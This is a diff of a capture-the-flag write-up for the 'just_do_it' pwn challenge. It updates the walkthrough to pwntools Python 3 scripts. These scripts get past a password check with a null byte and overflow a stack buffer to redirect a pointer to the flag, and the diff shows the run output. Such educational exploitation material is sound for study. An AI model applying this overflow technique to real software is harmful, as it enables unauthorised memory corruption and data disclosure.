@@ -80,13 +80,42 @@ So we can see that the file it is trying to open is `flag.txt`. We can also see 
         0804a03c c8 87 04 08     addr       s_P@SSW0RD_080487c8                              = "P@SSW0RD"
 ```
 
-So we can see that the string it is checking for is `P@SSW0RD`. Now since our input is being scanned in through an fgets call, a newline character `0x0a` will be appended to the end. So in order to pass the check we will need to put a null byte after `P@SSW0RD`.
+So we can see that the string it is checking for is `P@SSW0RD`. Now since our input is being scanned in through an fgets call, a newline character `0x0a` will be appended to the end. So in order to pass the check we will need to put a null byte after `P@SSW0RD`. Here is some python3 code to accomplish that:
 
 ```
-$    python -c 'print "P@SSW0RD" + "\x00"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
-Welcome my secret service. Do you know the password?
-Input the password.
+# Import pwntool utils
+from pwn import process, p32
+
+# Establish target process
+target = process('just_do_it')
+
+# Print out the starting prompt
+print(target.recvuntil(b"password.\n"))
+
+# Semd the password
+target.sendline(b"P@SSW0RD\x00")
+
+# Drop to an interactive shell, so we can read everything the binary
+target.interactive()
+```
+
+When we run it, we see that we have successfully authenticated:
+
+```
+$ python3 password.py 
+[!] Could not find executable 'just_do_it' in $PATH, using './just_do_it' instead
+[+] Starting local process './just_do_it': pid 6263
+b'Welcome my secret service. Do you know the password?\nInput the password.\n'
+[*] Switching to interactive mode
+[*] Process './just_do_it' stopped with exit code 0 (pid 6263)
 Correct Password, Welcome!
+[*] Got EOF while reading in interactive
+$ 
+[*] Got EOF while sending in interactive
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/process.py", line 787, in close
+    fd.close()
+BrokenPipeError: [Errno 32] Broken pipe
 ```
 
 So we passed the check, however that doesn't solve the challenge. We can see that with the fgets call, we can input 32 bytes worth of data into `vulnBuf`. Let's see how many bytes `vulnBuf` can hold:
@@ -134,7 +163,7 @@ So we can see that it can hold 16 bytes worth of data (0x28 - 0x18 = 16). So we 
   }
 ```
 
-So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes worth of data into `flag`. This is interesting because if we can find the address of `flag`, then we should be able to overwrite the value of `target` with that address and then it should print out the contents of `flag`, which should be the flag.
+So we can see here that after it opens the `flag.txt` file, it scans 48 bytes worth of data into `flag`. This is interesting because if we can find the address of `flag`, then we should be able to overwrite the value of `target` with that address and then it should print out the contents of `flag`, which should be the flag.
 
 ```
   .bss:0804A080 ; char flag[48]
@@ -143,52 +172,48 @@ So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes
 .bss:0804A080
 ```
 
-So here we can see that `flag` lives in the bss, with the address `0x0804a080`. There are 20 bytes worth of data between `vulnBuf` and `target` (0x28 - 0x14 = 20). So we can form a payload with 20 null bytes, followed by the address of `flag`:
+So here we can see that `flag` lives in the bss, with the address `0x0804a080`. There are 20 bytes worth of data between `vulnBuf` and `target` (0x28 - 0x14 = 20). So we can form a payload with 20 null bytes, followed by the address of `flag`. With this payload, we will be able to read the contents of `flag.txt` with our exploit. Let's write an exploit to do this:
 
 ```
-  python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
-Welcome my secret service. Do you know the password?
-Input the password.
-flag{gottem_boyz}
-```
+# Import pwntool utils
+from pwn import process, remote, p32
 
-So we were able to read the contents of `flag.txt` with our exploit. Let's write an exploit to use the same exploit against the server they have with the challenge running to get the flag. Here is the python code:
+# Create the remote connection to the challenge
+target = process('just_do_it')
+#target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)
 
-```
-#Import pwntools
-from pwn import *
+# Print out the starting prompt
+print(target.recvuntil(b"password.\n"))
 
-#Create the remote connection to the challenge
-target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)
+# Create the payload
+payload = b"\x00"*20 + p32(0x0804a080)
 
-#Print out the starting prompt
-print target.recvuntil("password.\n")
-
-#Create the payload
-payload = "\x00"*20 + p32(0x0804a080)
-
-#Send the payload
+# Send the payload
 target.sendline(payload)
 
-#Drop to an interactive shell, so we can read everything the server prints out
+# Drop to an interactive shell, so we can read everything the server prints out
 target.interactive()
 ```
 
 Now let's run it:
 
 ```
-$    python exploit.py
-[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 12482: Done
-Welcome my secret service. Do you know the password?
-Input the password.
-
+$ python3 exploit.py 
+[!] Could not find executable 'just_do_it' in $PATH, using './just_do_it' instead
+[+] Starting local process './just_do_it': pid 6167
+b'Welcome my secret service. Do you know the password?\nInput the password.\n'
 [*] Switching to interactive mode
+[*] Process './just_do_it' stopped with exit code 0 (pid 6167)
 TWCTF{pwnable_warmup_I_did_it!}
 
 [*] Got EOF while reading in interactive
-$
-[*] Interrupted
-[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 12482
+$ 
+[*] Got EOF while sending in interactive
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/pwnlib/tubes/process.py", line 787, in close
+    fd.close()
+BrokenPipeError: [Errno 32] Broken pipe
+guyinatuxedo@ubuntu:/Hackery/nightmare/modules/0
 ```
 
 Just like that, we captured the flag!
